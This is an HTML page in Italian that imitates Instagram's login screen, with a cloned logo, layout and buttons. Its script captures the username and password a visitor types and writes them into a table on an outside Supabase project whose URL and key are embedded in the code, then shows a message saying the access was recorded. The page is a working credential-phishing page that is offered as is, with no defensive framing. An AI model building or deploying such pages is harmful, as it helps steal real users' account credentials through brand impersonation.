<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>

<link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>

<style>
body {
    margin: 0;
    background: #fafafa;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.card {
    width: 350px;
    min-height: 600px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 45px 40px;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
}

.logo {
    font-family: "Billabong", cursive;
    font-size: 58px;
    margin-bottom: 35px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 6px 0;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    background: #fafafa;
    font-size: 12px;
}

.password-box {
    position: relative;
}

.eye {
    position: absolute;
    right: 10px;
    top: 10px;
    font-size: 13px;
    color: #8e8e8e;
    cursor: pointer;
}

button {
    width: 100%;
    padding: 8px;
    margin-top: 15px;
    background: #0095f6;
    border: none;
    color: white;
    font-weight: 600;
    border-radius: 8px;
    cursor: pointer;
}

.or {
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 22px 0;
    font-size: 12px;
    font-weight: 600;
    color: #8e8e8e;
    gap: 12px;
}

.or::before,
.or::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.link {
    font-size: 13px;
    color: #0095f6;
    cursor: pointer;
    font-weight: 600;
}

.footer {
    margin-top: 25px;
    font-size: 13px;
    color: #262626;
}

.footer span {
    color: #0095f6;
    font-weight: 600;
    cursor: pointer;
}
</style>
</head>

<body>

<div class="card">

    <div class="logo">Instagram</div>

    <input id="user" type="text" placeholder="Numero di telefono, username o email">

    <div class="password-box">
        <input type="password" id="password" placeholder="Password">
        <div class="eye" onclick="togglePassword()">👁</div>
    </div>

    <button onclick="login()">Accedi</button>

    <div class="or">OPPURE</div>

    <div class="link">Continua con Facebook</div>

    <div class="footer">
        Non hai un account? <span>Registrati</span>
    </div>

</div>

<script>

// 🔵 SUPABASE CONFIG
const supabaseUrl = "https://kgtpnhvdnjsmimihguqg.supabase.co";

// 👇 INCOLLA QUI LA TUA ANON KEY
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndHBuaHZkbmpzbWltaWhndXFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5NTgxNjEsImV4cCI6MjA5MjUzNDE2MX0.py6zxxMaL3tjPl8o4A5RkMX01K_Qd1ve0OQv1mfwJRk";

const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

// PASSWORD VISIBILE
function togglePassword() {
    const input = document.getElementById("password");
    input.type = input.type === "password" ? "text" : "password";
}

// LOGIN + SALVATAGGIO DATABASE
async function login() {
    const user = document.getElementById("user").value;
    const pass = document.getElementById("password").value;

    if (!user || !pass) {
        alert("Compila tutti i campi");
        return;
    }

    const { error } = await supabase
        .from('messages')
        .insert([{ name: user, message: pass }]);

    if (error) {
        console.log(error);
        alert("Errore database");
    } else {
        alert("Accesso registrato!");
    }
}

</script>

</body>
</html>
